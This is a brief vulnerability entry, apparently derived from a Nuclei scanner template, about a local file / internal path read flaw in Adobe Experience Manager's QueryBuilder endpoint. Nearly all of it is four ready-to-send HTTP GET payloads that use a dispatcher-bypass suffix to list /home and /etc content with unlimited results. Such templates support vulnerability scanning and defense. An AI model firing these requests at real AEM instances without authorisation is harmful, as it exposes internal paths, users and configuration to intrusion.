# Vulnerability: AEM QueryBuilder Internal Path Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`aem-querybuilder-internal-path-read.yaml`)

## Description
AEM QueryBuilder is vulnerable to LFI.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1
```

